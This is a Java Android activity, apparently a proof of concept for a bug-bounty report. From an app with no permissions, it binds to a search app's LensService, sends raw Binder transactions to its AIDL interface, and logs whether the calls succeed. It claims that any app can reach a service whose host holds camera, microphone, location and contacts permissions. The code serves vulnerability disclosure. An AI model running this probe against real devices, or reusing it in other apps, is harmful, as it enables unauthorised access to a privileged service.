package com.vrp.poc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.widget.TextView;
import android.widget.ScrollView;

public class LensServiceBindActivity extends Activity {
    private static final String TAG = "LensServiceBind";
    private StringBuilder log = new StringBuilder();
    private IBinder lensServiceBinder;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        final TextView tv = new TextView(this);
        tv.setPadding(20, 20, 20, 20);
        tv.setTextSize(14);
        sv.addView(tv);
        setContentView(sv);

        log.append("=== AGSA LensService Binding PoC ===\n");
        log.append("VRP Report #37\n\n");
        log.append("Target: LensService (ILensService AIDL)\n");
        log.append("Permission: LENS_SERVICE (normal = auto-granted)\n\n");

        log.append("[TEST 1] Binding to LensService...\n");
        tv.setText(log.toString());

        Intent bindIntent = new Intent();
        bindIntent.setComponent(new ComponentName(
            "com.google.android.googlequicksearchbox",
            "com.google.android.apps.search.lens.service.LensService"
        ));

        try {
            boolean bound = bindService(bindIntent, new ServiceConnection() {
                @Override
                public void onServiceConnected(ComponentName name, IBinder service) {
                    lensServiceBinder = service;
                    log.append("[OK] Bound to LensService!\n");
                    log.append("  Component: " + name + "\n");
                    log.append("  Binder: " + service.getClass().getName() + "\n\n");

                    log.append("[TEST 2] Sending transaction 1 (Bundle)...\n");
                    try {
                        Parcel data = Parcel.obtain();
                        Parcel reply = Parcel.obtain();
                        data.writeInterfaceToken(
                            "com.google.android.libraries.lens.sdk.shared.ILensService");
                        Bundle payload = new Bundle();
                        payload.putInt("api_version", 1);
                        data.writeBundle(payload);
                        boolean result = service.transact(1, data, reply, 0);
                        reply.readException();
                        log.append("[OK] Transaction 1 succeeded: " + result + "\n\n");
                        data.recycle();
                        reply.recycle();
                    } catch (RemoteException re) {
                        log.append("[FAIL] Transaction 1: " + re.getMessage() + "\n\n");
                    } catch (Exception e) {
                        log.append("[INFO] Transaction 1: " + e.getClass().getSimpleName() +
                            ": " + e.getMessage() + "\n\n");
                    }

                    log.append("[TEST 3] Sending transaction 3 (empty)...\n");
                    try {
                        Parcel data3 = Parcel.obtain();
                        Parcel reply3 = Parcel.obtain();
                        data3.writeInterfaceToken(
                            "com.google.android.libraries.lens.sdk.shared.ILensService");
                        boolean result3 = service.transact(3, data3, reply3, 0);
                        reply3.readException();
                        log.append("[OK] Transaction 3 succeeded: " + result3 + "\n");
                        data3.recycle();
                        reply3.recycle();
                    } catch (RemoteException re) {
                        log.append("[FAIL] Transaction 3: " + re.getMessage() + "\n");
                    } catch (Exception e) {
                        log.append("[INFO] Transaction 3: " + e.getClass().getSimpleName() +
                            ": " + e.getMessage() + "\n");
                    }

                    log.append("\n=== Results ===\n");
                    log.append("LensService bound successfully from zero-permission app.\n");
                    log.append("The LENS_SERVICE permission (normal level)\n");
                    log.append("was auto-granted without user prompt.\n");
                    log.append("\nIMPACT: Any app can bind to AGSA's LensService.\n");
                    log.append("AGSA holds camera, mic, location, contacts, storage.\n");

                    tv.setText(log.toString());
                    Log.d(TAG, log.toString());
                }

                @Override
                public void onServiceDisconnected(ComponentName name) {
                    log.append("[DISCONNECTED] " + name + "\n");
                    tv.setText(log.toString());
                }
            }, BIND_AUTO_CREATE);

            log.append(bound ? "[OK] bindService() returned true, waiting...\n" :
                "[FAIL] bindService() returned false\n");
        } catch (SecurityException se) {
            log.append("[BLOCKED] " + se.getMessage() + "\n");
        } catch (Exception e) {
            log.append("[ERROR] " + e.getMessage() + "\n");
        }

        tv.setText(log.toString());
    }
}
